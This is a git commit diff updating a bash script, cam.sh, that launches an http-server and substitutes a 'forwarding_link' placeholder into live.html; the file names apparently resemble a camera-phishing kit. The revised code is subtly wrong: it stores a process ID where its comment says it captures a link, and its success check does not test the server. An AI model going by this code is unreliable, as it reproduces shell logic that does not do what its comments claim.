d69d6cbc108efe19bbf7ca70b474664656a0da7a
Samar Dhital <137791769+STAPARMY@users.noreply.github.com>
2023-11-02 17:10:24 +0545

    Update cam.sh

--- cam.sh
+++ cam.sh
@@ -1,11 +1,15 @@
 #!/bin/bash
 
+# Start http-server in the background and capture the output (link)
+link=$(http-server -p 3333 -c-1 -s & echo $!)
 
-link=$(http-server -p 3333)
-
-# Check if the variable $options_tem is equal to 1
-if [[ $options_tem -eq 1 ]]; then
+# Check if the http-server started successfully
+if [[ $? -eq 0 ]]; then
     # Replace the placeholder "forwarding_link" with the generated link in the live.html file
-    sed 's+forwarding_link+'$link'+g' live.html > live_updated.html
+    sed 's+forwarding_link+'"$link"'+g' live.html > live_updated.html
     mv live_updated.html live.html
+    echo "Server started at http://localhost:3333"
+else
+    echo "Failed to start the server"
 fi
+
